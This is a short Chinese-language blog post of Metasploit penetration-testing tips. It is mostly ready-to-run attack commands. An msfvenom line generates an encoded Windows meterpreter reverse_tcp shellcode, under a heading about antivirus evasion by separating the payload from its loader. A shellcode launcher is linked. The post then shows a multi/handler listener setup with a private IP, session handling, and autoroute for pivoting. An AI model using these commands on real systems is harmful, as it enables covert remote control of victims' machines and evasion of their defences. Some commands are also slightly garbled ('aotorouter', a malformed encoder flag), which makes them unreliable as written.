---
layout: post
title: metasploit 使用tips
categories: 渗透测试
tag: metasploit
---

## payload 生成 、 分离免杀

- 生成shellcode

    `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ip lport=port -ex86/shikata_ga_nai -i 5 -f raw > test.c`

- shellcode 加载器

    https://github.com/clinicallyinane/shellcode_launcher/
    `shellcode_launcher.exe -i test.c`

## meterpreter 

- handle
    ```
    use exploit/multi/handle
    set payload windows/meterpreter/reverse_tcp
    set lport 4444
    set lhost 192.168.231.23
    run
    ```

-  sessions 查看当前session
    - background 切换sessions 至后台
    - sessions -i 1  将session 1 调至前台

- run aotorouter -p  自动添加路由
    - post/multi/manage/autoroute自动添加路由
